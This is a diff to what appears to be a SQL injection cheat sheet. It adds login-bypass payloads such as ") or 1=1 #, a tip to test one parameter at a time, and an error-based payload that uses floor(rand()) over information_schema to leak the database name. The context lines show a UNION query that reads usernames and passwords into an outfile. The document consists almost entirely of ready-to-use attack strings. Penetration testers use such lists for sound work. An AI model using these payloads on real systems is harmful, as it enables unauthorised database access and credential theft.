@@ -947,14 +947,16 @@ artists.php?artist=-1 union select 1,username,password from users into outfile "
 
 Test error based in login forms or any post parameter
 
+Also test single parameter at a time with " to break the query because multiple can balance the query
+
 
 ")    #
 
 ")  1=1 # 
 
-")  or 1 # 
+")  or 1=1 # 
 
-")  1=1  LIMIT 3,1  #  
+")  or 1=1  LIMIT 3,1  #  
 
 ")   ORDER BY 2 #
 
@@ -978,14 +980,14 @@ admin
 admin
 '  or 1=1 #
 
+1' AND (select 1 from(select count(*), concat(0x3a,(select database()),0x3a, floor(rand()*2)) from information_schema.columns group by a)b) --+
+
 
 
 
 
 
                                                                          User agent field / Insert query 
-
-
 
 
 '
